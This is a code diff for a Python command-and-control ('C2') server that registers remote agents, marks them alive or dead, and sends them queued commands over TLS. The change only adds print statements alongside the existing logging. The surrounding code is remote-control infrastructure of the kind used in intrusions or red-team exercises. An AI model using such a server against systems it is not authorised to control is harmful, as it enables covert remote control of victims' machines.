@@ -64,9 +64,11 @@ def handle_agent(conn, addr):
                 "status": "alive",
             }
             logging.info(f"Agent {agent_id} registered from {addr[0]}")
+            print(f"Agent {agent_id} registered from {addr[0]}")
         elif agents_db[agent_id]["status"] == "dead":
             agents_db[agent_id]["status"] = "alive"
             logging.info(f"Agent {agent_id} marked as active from {addr[0]}")
+            print(f"Agent {agent_id} marked as active from {addr[0]}")
         agents_db[agent_id]["date"] = datetime.datetime.now().isoformat()
         save_db()
         # Send command if available
@@ -77,6 +79,7 @@ def handle_agent(conn, addr):
         conn.sendall(json.dumps(response).encode())
     except (ConnectionResetError, BrokenPipeError):
         logging.warning(f"Client at {addr[0]} disconnected unexpectedly.")
+        print(f"Client at {addr[0]} disconnected unexpectedly.")
     except json.JSONDecodeError:
         logging.warning(f"Invalid JSON received from {addr[0]} — ignoring.")
     except Exception as e:
@@ -86,7 +89,7 @@ def handle_agent(conn, addr):
 
 def server_listener(host='0.0.0.0', port=9999):
     if not os.path.exists(CERT_PATH) or not os.path.exists(KEY_PATH):
-        logging.error("Missing certificate or key. Please generate an SSL certificate.")
+        print("Missing certificate or key. Please generate an SSL certificate.")
         return
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     context.load_cert_chain(certfile=CERT_PATH, keyfile=KEY_PATH)
@@ -95,6 +98,7 @@ def server_listener(host='0.0.0.0', port=9999):
         sock.bind((host, port))
         sock.listen()
         logging.info(f"Secure C2 server listening on {host}:{port}")
+        print(f"[*] Secure C2 server listening on {host}:{port}")
 
         while True:
             client_sock, addr = sock.accept()
